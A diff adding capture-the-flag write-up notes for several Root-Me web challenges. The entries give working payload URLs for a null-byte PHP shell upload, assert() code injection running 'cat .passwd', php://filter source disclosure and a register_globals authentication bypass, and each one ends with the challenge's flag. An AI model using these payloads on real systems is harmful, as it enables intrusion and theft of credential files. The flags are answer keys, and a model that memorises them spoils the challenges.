@@ -74,6 +74,41 @@ change into: http://challenge01.root-me.org/web-serveur/ch52/?url=https://google
 						 http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt
 	>>>kcb$!Bx@v4Gs9Ez
 
+17. File upload - null byte: creat a shell php file and change it name to: shell.php%00.png>> file will be uploaded
+			Get flag: http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/7fnmajn87bmh2so0494vfnuoh0/shell.php?command=%20../../../.passwd
+	>>>YPNchi2NmTwygr2dgCCF
+
+18.	LFI PHP assert(): PAYLOAD 
+					http://challenge01.root-me.org/web-serveur/ch47/?page=','..')==false and system('cat .passwd') and strpos('
+	>>>x4Ss3rT1nglSn0ts4f3A7A1Lx
+
+
+
+19.	PHP filters: Get source by base64 encode with php://filter: 
+					http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=ch12.php 
+				decode the resulf (in ch12.php) >> u will config.php >> do it again 
+					http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php >> decode(config_ch12.php) >>> get flag
+	>>>DAPt9D2mky0APAF
+
+20. PHP register globals: dowwnload backup index.php :challenge01.root-me.org/web-serveur/ch17/index.php.bak
+		You can see the if code :
+		<
+				if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
+    				$aff=display("well done, you can validate with the password : $hidden_password");>
+
+   			 So. there are 2 ways to get flag:
+    			1. Set $_SESSION["logged"]==1:
+    				Link: http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
+    			2. Use burp to add password=1&hidden_password=1 >>Go   
+    				Then delete it and go again <image ch17_1 and ch17_2>
+    >>>NoTQYipcRKkgrqG
+
+
+
+
+
+
+
 
 
 
